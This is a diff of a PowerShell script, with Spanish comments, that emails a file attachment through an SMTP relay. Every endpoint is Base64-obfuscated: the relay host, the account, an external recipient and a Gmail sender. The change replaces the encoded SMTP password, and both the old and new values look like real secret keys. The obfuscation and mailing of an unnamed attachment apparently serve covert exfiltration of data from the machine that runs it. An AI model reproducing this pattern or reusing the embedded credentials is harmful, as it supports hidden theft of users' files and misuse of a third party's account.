@@ -144,15 +144,19 @@ while ($attempts -gt 0) {
 
 
 # COMPLEJO - Reemplaza estas lÃ­neas:
+
+# Enviar correo electrónico con el archivo adjunto
 $smtp_server = (-join [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('c210cC1yZWxheS5icmV2by5jb20=')).ToCharArray() | ForEach-Object {$_}) -join ''
 $smtp_port = 587
 $smtp_username = (-join [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YTIyNGFhMDAxQHNtdHAtYnJldm8uY29t')).ToCharArray() | ForEach-Object {$_}) -join ''
-$smtp_password = (-join [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('eHNtdHBzaWItOGIyYTRmODA2ZDQ0NzJiYmQ4M2RhYjIzNTFiYmMyNTIxN2I2OWYxNmNiYmMzMTRmYjZlZjViNzY0YWZhYjBhMC1LMlI1YjFtd3VadERsRm5G')).ToCharArray() | ForEach-Object {$_}) -join ''
+$smtp_password = (-join [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('eHNtdHBzaWItOGIyYTRmODA2ZDQ0NzJiYmQ4M2RhYjIzNTFiYmMyNTIxN2I2OWYxNmNiYmMzMTRmYjZlZjViNzY0YWZhYjBhMC1scEgyTXJlU1hlaEw1OVRY')).ToCharArray() | ForEach-Object {$_}) -join ''
 $cred = New-Object System.Net.NetworkCredential($smtp_username, $smtp_password)
 $email_to = @((-join [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dGlja2V0c0Bzb2xleC5iaXo=')).ToCharArray() | ForEach-Object {$_}) -join '')
 
 $MailMessage = New-Object System.Net.Mail.MailMessage
 $MailMessage.From = (-join [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('c29sZXhhY3Rpdm9zc2NsQGdtYWlsLmNvbQ==')).ToCharArray() | ForEach-Object {$_}) -join ''
+
+
 
 
 foreach ($recipient in $email_to) {
@@ -170,4 +174,5 @@ $SmtpClient.Send($MailMessage)
 
 
 Write-Host "Correo enviado exitosamente."
+
 
